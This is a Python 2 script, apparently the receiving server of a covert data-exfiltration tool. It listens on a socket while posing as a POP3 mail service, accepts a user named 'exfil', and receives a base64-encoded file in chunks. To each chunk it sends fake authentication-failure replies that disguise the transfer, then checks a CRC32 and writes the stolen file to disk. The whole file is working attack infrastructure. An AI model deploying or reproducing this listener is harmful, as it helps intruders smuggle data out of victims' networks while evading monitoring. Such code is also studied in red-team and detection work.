#!/usr/bin/python

import sys
import zlib
import socket
import base64
import progressbar

from thread import *


# Configurations
host = '127.0.0.1'
port = 1100
conns = 5

# Globals
MAX_SIZE = 4000
CHUNK = 256
ERR = 1
OKAY = 0


def _open_socket():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((host, port))
        sock.listen(conns)
    except socket.error, e:
        sys.stderr.write("[-] Socket error trying to listen to %s:%s.\n" % (host, port))
        sys.stderr.write(str(e))
        sys.exit(ERR)
    sys.stdout.write("[+] Established a listening on %s:%s.\n" % (host, port))
    return sock

#Function for handling connections. This will be used to create threads
def clientthread(conn):
    conn.send('+OK POP3 service\n')
    data = conn.recv(MAX_SIZE)
    if data.find("USER exfil") == -1:
        conn.send("Bad user\n")
        conn.close()
        sys.stdout.write("[-] Connection from %s used wrong password. Disconnected.\n")
        return OKAY

    conn.send("+OK password required for user exfil\n")
    data = conn.recv(MAX_SIZE)
    try:
        conv = base64.b64decode(data)
    except:
        conn.close()
        sys.stderr.write("Could not decode to base64.\n")
        return ERR
    conv = conv.split(";")
    sys.stdout.write("[+] Getting file %s with total of %s packets.\n" % (conv[0], conv[2]))
    conn.send("-ERR [AUTH] Authentication failed\n")
    file_name = conv[0].split("/")[-1]

    packet_counter = 0
    entire_file = ""

    progress = progressbar.ProgressBar()
    for i in progress(range(int(conv[2]))):         # Was While-True
        data = conn.recv(MAX_SIZE)
        conn.send("-ERR [AUTH] Authentication failed\n")
        packet_counter += 1
        try:
            counter, cont = data.split(";")
            entire_file += cont
        except:
            if data.find("0000") != -1:
                if packet_counter-1 == int(conv[2]):
                    sys.stdout.write("[+] Got all packets i needed (%s/%s).\n" % (packet_counter-1, conv[2]))
                else:
                    sys.stderr.write("[!] Got different number of packets from what needed (%s/%s).\n" % (packet_counter-1, conv[2]))
                # End of file
                break

    file_cont = base64.b64decode(entire_file)
    crc_check = zlib.crc32(file_cont)
    if crc_check == int(conv[1]):
        sys.stdout.write("[+] File CRC32 checksum is matching.\n")
    else:
        sys.stderr.write("[-] CRC32 checksum does not match. Saving anyway.\n")

    f = open(file_name, 'wb')
    f.write(file_cont)
    f.close()
    sys.stdout.write("[+] Saved file '%s' with length of %s.\n" % (file_name, len(file_cont)))


if __name__ == "__main__":
    sockObj = _open_socket()
    while True:
        try:
            conn, address = sockObj.accept()
            sys.stdout.write("[+] Received a connection from %s:%s.\n" % (address[0], address[1]))
            start_new_thread(clientthread ,(conn,))
        except KeyboardInterrupt:
            sys.stdout.write("\nGot KeyboardInterrupt, exiting now.\n")
            sys.exit(ERR)
